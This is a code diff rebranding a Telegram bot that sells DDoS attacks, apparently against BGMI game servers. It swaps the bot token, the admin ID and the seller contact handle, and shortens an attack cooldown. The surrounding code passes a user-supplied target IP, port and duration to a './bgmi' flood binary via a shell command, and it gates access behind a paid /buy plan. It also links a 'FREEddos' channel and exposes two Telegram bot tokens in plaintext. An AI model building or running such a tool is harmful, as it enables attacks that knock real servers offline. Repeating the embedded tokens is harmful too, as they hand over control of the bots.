@@ -8,9 +8,9 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7132459718:AAEai9Nl02pj4MfszJrwL6VUKjXhjEu0FMM')
+bot = telebot.TeleBot('7240772241:AAGIR_uyA6VT9dsk-SuItQ0ourh1-x-A1-c')
 # Join :- https://t.me/FREEddosJoinnow # Admin user IDs
-admin_id = ["2008417330"]
+admin_id = ["5904877352"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -149,7 +149,7 @@ def add_user(message):
         else:
             response = "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗽𝗲𝗰𝗶𝗳𝘆 𝗮 𝘂𝘀𝗲𝗿 𝗜𝗗 𝗮𝗻𝗱 𝘁𝗵𝗲 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 ( 𝟭𝗵𝗼𝘂𝗿, 𝟭𝗱𝗮𝘆𝘀, 𝟳𝗱𝗮𝘆𝘀, 𝟯𝟬𝗱𝗮𝘆𝘀 ) 𝘁𝗼 𝗮𝗱𝗱 😘."
     else:
-        response = "𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @MrHellenG 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨."
+        response = "𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @radhe2453 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨."
 
     bot.reply_to(message, response)
 
@@ -285,7 +285,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Join :- @MrHellenG # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds <100:
-                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗢𝗻 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 . 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 100 Seconds 𝗕𝗲𝗳𝗼𝗿𝗲 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗧𝗵𝗲 /bgmi 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗔𝗴𝗮𝗶𝗻."
+                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗢𝗻 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 . 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 10 Seconds 𝗕𝗲𝗳𝗼𝗿𝗲 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗧𝗵𝗲 /bgmi 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗔𝗴𝗮𝗶𝗻."
                 bot.reply_to(message, response)
                 return
             # Join :- @MrHellenG # Update the last time the user ran the command
@@ -301,14 +301,14 @@ def handle_bgmi(message):
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Join :- @MrHellenG# Call start_attack_reply function
+                start_attack_reply(message, target, port, time)  # Join :- @radhe2453# Call start_attack_reply function
                 full_command = f"./bgmi {target} {port} {time} 900"
                 subprocess.run(full_command, shell=True)
                 response = f"🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 ☄️ {target}:{port}\n🎉𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🎊𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮🥳"
         else:
             response = "🤦‍♂️𝙐𝙨𝙖𝙜𝙚: /𝙗𝙜𝙢𝙞 <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚_𝙨𝙚𝙘𝙤𝙣𝙙𝙨>\n\n🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚  /bgmi 20.235.94.237 17870 200"  # Join :- https://t.me/FREEddosJoinnow # Updated command syntax
     else:
-        response = " 𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @MrHellenG 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨"
+        response = " 𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\nPAPA SE BAAT KAR\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @radhe2453 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨"
 
     bot.reply_to(message, response)
 
@@ -329,7 +329,7 @@ def show_command_logs(message):
         except FileNotFoundError:
             response = "𝗡𝗼 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗹𝗼𝗴𝘀 𝗳𝗼𝘂𝗻𝗱."
     else:
-        response = "𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @MrHellenG 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨"
+        response = "𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @radhe2453 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨"
 
     bot.reply_to(message, response)
 
@@ -376,7 +376,7 @@ def welcome_plan(message):
 @bot.message_handler(commands=['buy'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f''' ☑️ 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙁𝙤𝙧 @MrHellenG 𝙏𝙤 𝙂𝙚𝙩 ??𝙘𝙘𝙚𝙨𝙨 🍾
+    response = f''' ☑️ 𝘾𝙤𝙣𝙩𝙖𝙘𝙩 𝙁𝙤𝙧 @radhe2453 𝙏𝙤 𝙂𝙚𝙩 ??𝙘𝙘𝙚𝙨𝙨 🍾
 '''
     bot.reply_to(message, response)
 
